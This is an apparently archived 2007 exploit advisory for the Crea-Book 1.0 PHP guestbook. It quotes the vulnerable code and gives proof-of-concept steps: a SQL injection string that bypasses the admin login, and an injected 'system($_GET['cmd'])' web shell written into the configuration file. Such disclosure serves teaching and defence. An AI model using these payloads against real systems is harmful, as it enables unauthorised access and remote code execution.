<html><head><title>Crea-Book <= 1.0 Admin Access Bypass / DB Disclosure / Code Execution</title></head><pre>	/=======================================\
	| Advisory :: Crea-Book &lt;= 1.0		|
	+=======================================+---------------------------------------------------------------\
	|													|
	|      Download link : http://www.comscripts.com/scripts/php.creabook.1359.html				|
	|               Type : Guestbook									|
	|        Vuln. found : Admin Access Bypass, DB information Disclosure &amp; Code Execution Weakness	|
	| 	  Conditions : magic_quotes_gpc = Off								|
	|	  Risk level : High										|
	|													|
	+-------------------------------------------------------------------------------------------------------+
	|													|
	| Program audited by : Xst3nZ &lt;xst3nz@gmail.com&gt; [fr/en]						|
	|               Date : 2007-04-10									|
	|	 Last update : 2007-04-10									|
	|													|
	+-------------------------------------------------------------------------------------------------------+
	| 	     Summary : 	0] Description									|
	|			1] Vuln#1 : Administrative Access Bypass using basic SQL injection		|
	|			2] Vuln#2 : PHP Code Execution Weakness						|
	|			3] Links &amp; Documentation							|
	\-------------------------------------------------------------------------------------------------------/


=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 &lt;0&gt; DESCRIPTION
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

  This script is old but analysing it is a good way to understand some classic security holes in web
applications. It's just a good and fast training.
Let's g0 ...

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 &lt;1&gt; VULNERABILITY #1 : ADMINISTRATIVE ACCESS BYPASS USING BASIC SQL INJECTION

  { Concerned file : admin/admin.php }
  { Cond: magic_quotes_gpc=Off }
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

  If we open the file 'admin/admin.php', we can see that the following code is executed after the submission of
the login authentification form :

+--------8&lt;--------
| // [...] line 8
| $sql=&quot;Select * from $table2 where pseudo='$pseudo' and passe='$passe'&quot;;
| // By the way, we can notice that the script works only if register_globals=On
| $res=mysql_query($sql);
| $nb=mysql_num_rows($res);
| if ($nb&gt;0)
| {
| 	// Login OK [...]
| }
| else
| 	header(&quot;Location: index.php?erreur=2&quot;);
| // line 208 (EOF)
+--------8&lt;--------

In fact, the variables called $pseudo and $passe aren't sanitized and so, it is possible to bypass easily the
authentification by using a basic SQL injection (see [1]). Nevertheless, single quotes must be used in this injection.
Therefore, the magic_quote_gpc parameter must be disabled (Off) in the php.ini configuration file.

  +----&gt;&gt; Vuln. #1 Pro0f of Concept &lt;&lt;--------
  |
  | - Go to : http://www.victim.com/[install_directory]/admin/admin.php
  | - Type the following string in the two fields :
  |  	| Pseudo (login) : evil
  |	| Mot de passe (password) : 1' OR '1'='1
  | - If magic_quotes_gpc=Off, you are now logged as admin. So, you have access to the control panel.
  | - Let's go to the section called 'Configurer le script' (configure the script). In this page, you can see
  | all the different informations required to connect to the MySQL server (DataBase Information Disclosure)
  |
  +-------------------------------------------//


=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 &lt;2&gt; VULNERABILITY #2 : PHP CODE EXECUTION WEAKNESS

  { Concerned file : admin/configurer2.php }
  { Cond: magic_quotes_gpc=Off, admin access OK }
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

  The file 'admin/configurer2.php', which is used when the configuration form is submitted, contains the following
code :

+--------8&lt;--------
| // [...] line 95
| $fichier = fopen(&quot;../config.inc.php3&quot;,&quot;w+&quot;) OR die (&quot;...&quot;);;
| fwrite($fichier, &quot;&lt;?php\n&quot;) or die (&quot;...&quot;);
| fwrite($fichier, &quot;// Infos de connexion √  la base de donn√©es\n\n$&quot;);
| fwrite($fichier, &quot;bddserver = \&quot;$bddserver\&quot;;\n$&quot;);
| // [...]
| fwrite($fichier, &quot;mess_fin = \&quot;$mess_fin\&quot;;\n&quot;);
| fwrite($fichier, &quot;?&gt;&quot;);
| fclose($fichier);
| // line 125
+--------8&lt;--------

So, all the information which are typed in the form are written in a PHP file called 'config.inc.php3' without
any verification before. Consequently, a malicious person which have an admin access (easy with the vuln #1) can put
what she wants in the file in question (only if magic_quotes_gpc=Off because double quotes are used). Let's 
see an example in the next PoC :

  +----&gt;&gt; Vuln. #2 Pro0f of Concept &lt;&lt;--------
  |
  | - Log in as admin on 'admin/admin.php' (see Vuln. #1 PoC).
  | - Go to 'admin/configurer.php'.
  | - Type the following string in one of the fields : value&quot;; [Malicious PHP code]; $nothing=&quot;
  | Example with the fields 'Fond de la page' (background color) : #FFFFFF&quot;; system($_GET['cmd']); $nothing=&quot;
  |         that gives : $fond = &quot;#FFFFFF&quot;; system($_GET['cmd']); $nothing=&quot;&quot;;
  |
  +-------------------------------------------//

Note : the file 'install/index.php' isn't deleted after the installation and it contains the same configuration
form. But, database information (login, password, DB name, server name) are required to write data into the PHP file...


=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 &lt;3&gt; LINKS &amp; DOCUMENTATION
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

 [1] SQL injection Attacks by Example (good)
	http://www.unixwiz.net/techtips/sql-injection.html


// [EOF] Xst3nZ

# milw0rm.com [2007-04-10]</pre></html>